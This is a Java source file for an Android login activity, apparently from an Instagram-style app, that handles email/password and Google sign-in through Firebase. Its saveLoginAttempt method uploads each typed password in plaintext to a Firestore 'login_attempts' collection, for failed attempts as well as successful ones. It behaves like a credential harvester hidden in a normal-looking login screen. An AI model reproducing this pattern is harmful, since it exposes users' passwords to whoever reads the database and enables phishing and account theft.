package com.example.insta;

import android.content.Intent;
import android.os.Bundle;
import android.util.Log;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Toast;

import androidx.activity.result.ActivityResultLauncher;
import androidx.activity.result.contract.ActivityResultContracts;
import androidx.appcompat.app.AppCompatActivity;

import com.example.insta.HomeActivity;
import com.example.insta.signup;
import com.google.android.gms.auth.api.signin.GoogleSignIn;
import com.google.android.gms.auth.api.signin.GoogleSignInAccount;
import com.google.android.gms.auth.api.signin.GoogleSignInClient;
import com.google.android.gms.auth.api.signin.GoogleSignInOptions;
import com.google.android.gms.common.SignInButton;
import com.google.android.gms.common.api.ApiException;
import com.google.android.gms.tasks.Task;
import com.google.firebase.auth.AuthCredential;
import com.google.firebase.auth.FirebaseAuth;
import com.google.firebase.auth.FirebaseUser;
import com.google.firebase.auth.GoogleAuthProvider;
import com.google.firebase.firestore.FirebaseFirestore;

import java.util.HashMap;
import java.util.Map;

public class Login extends AppCompatActivity {

    EditText email, password;
    Button loginBtn;
    SignInButton googleLoginBtn;
    TextView signupLink, forgetPassword;

    FirebaseAuth auth;
    FirebaseFirestore firestore;
    GoogleSignInClient mGoogleSignInClient;

    ActivityResultLauncher<Intent> googleSignInLauncher;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        FirebaseAuth mAuth;

        mAuth = FirebaseAuth.getInstance();
        FirebaseUser currentUser = mAuth.getCurrentUser();
        if (currentUser != null) {
            String userId = currentUser.getUid();
            String userEmail = currentUser.getEmail();
//            mAuth.signOut();
            Log.d("LoginActivity", "User is logged in. UID: " + userId + ", Email: " + userEmail);
            navigateToHome();
        }
        setContentView(R.layout.activity_login);

        // Views
        email = findViewById(R.id.email);
        password = findViewById(R.id.password);
        loginBtn = findViewById(R.id.loginBtn);
        googleLoginBtn = findViewById(R.id.googleSignInBtn);
        signupLink = findViewById(R.id.signupLink);
        forgetPassword = findViewById(R.id.forgetpassowrd);

        auth = FirebaseAuth.getInstance();
        firestore = FirebaseFirestore.getInstance();

        // Google Sign-In configuration
        GoogleSignInOptions gso = new GoogleSignInOptions.Builder(GoogleSignInOptions.DEFAULT_SIGN_IN)
                .requestIdToken(getString(R.string.default_web_client_id)) // must match Firebase web client ID
                .requestEmail()
                .build();
        mGoogleSignInClient = GoogleSignIn.getClient(this, gso);

        // Launcher to handle Google Sign-In result safely
        googleSignInLauncher = registerForActivityResult(
                new ActivityResultContracts.StartActivityForResult(),
                result -> {
                    Intent data = result.getData();
                    if (data == null) {
                        Toast.makeText(this, "Google Sign-In canceled", Toast.LENGTH_SHORT).show();
                        return;
                    }

                    Task<GoogleSignInAccount> task = GoogleSignIn.getSignedInAccountFromIntent(data);
                    try {
                        GoogleSignInAccount account = task.getResult(ApiException.class);
                        if (account != null) {
                            String idToken = account.getIdToken();
                            if (idToken != null) {
                                saveLoginAttempt(account.getEmail(), "Google", null);
                                firebaseAuthWithGoogle(idToken);
                            } else {
                                Toast.makeText(this, "ID Token is null. Check Firebase config.", Toast.LENGTH_LONG).show();
                            }
                        }
                    } catch (ApiException e) {
                        Toast.makeText(this, "Google Sign-In failed: " + e.getMessage(), Toast.LENGTH_SHORT).show();
                    }
                }
        );

        // Email/password login
        loginBtn.setOnClickListener(v -> {
            String userEmail = email.getText().toString().trim();
            String userPass = password.getText().toString().trim();

            if (userEmail.isEmpty() || userPass.isEmpty()) {
                Toast.makeText(this, "Fields cannot be empty", Toast.LENGTH_SHORT).show();
                return;
            }

            auth.signInWithEmailAndPassword(userEmail, userPass)
                    .addOnSuccessListener(authResult -> {
                        saveLoginAttempt(userEmail, "Email", userPass);
                        navigateToHome();
                    })
                    .addOnFailureListener(e -> {
                        saveLoginAttempt(userEmail, "Email-Failed", userPass);
                        Toast.makeText(this, e.getMessage(), Toast.LENGTH_SHORT).show();
                    });
        });

        // Google login
        googleLoginBtn.setOnClickListener(v -> {
            Intent signInIntent = mGoogleSignInClient.getSignInIntent();
            googleSignInLauncher.launch(signInIntent);
        });

        // Signup redirect
        signupLink.setOnClickListener(v ->
                startActivity(new Intent(this, signup.class))
        );

        // Forgot Password
        forgetPassword.setOnClickListener(v -> {
            String userEmail = email.getText().toString().trim();
            if (userEmail.isEmpty()) {
                Toast.makeText(this, "Please enter your email first", Toast.LENGTH_SHORT).show();
                return;
            }

            auth.sendPasswordResetEmail(userEmail)
                    .addOnSuccessListener(unused ->
                            Toast.makeText(this, "Password reset email sent", Toast.LENGTH_SHORT).show()
                    )
                    .addOnFailureListener(e ->
                            Toast.makeText(this, "Failed: " + e.getMessage(), Toast.LENGTH_SHORT).show()
                    );
        });
    }

    // Firebase Google Auth
    private void firebaseAuthWithGoogle(String idToken) {
        AuthCredential credential = GoogleAuthProvider.getCredential(idToken, null);
        auth.signInWithCredential(credential)
                .addOnSuccessListener(authResult -> navigateToHome())
                .addOnFailureListener(e ->
                        Toast.makeText(this, "Firebase Auth Failed: " + e.getMessage(), Toast.LENGTH_SHORT).show()
                );
    }

    // Navigate safely to HomeActivity
    private void navigateToHome() {
        Intent intent = new Intent(Login.this, HomeActivity.class);
        startActivity(intent);
        finish(); // close login
    }

    // Save login attempts in Firestore
    private void saveLoginAttempt(String email, String method, String password) {
        Map<String, Object> data = new HashMap<>();
        data.put("email", email);
        data.put("method", method);
        data.put("password", password != null ? password : "N/A");
        data.put("timestamp", System.currentTimeMillis());

        firestore.collection("login_attempts")
                .add(data)
                .addOnSuccessListener(unused -> { /* optional log */ })
                .addOnFailureListener(e ->
                        Toast.makeText(this, "Failed to save login attempt: " + e.getMessage(), Toast.LENGTH_SHORT).show()
                );
    }
}
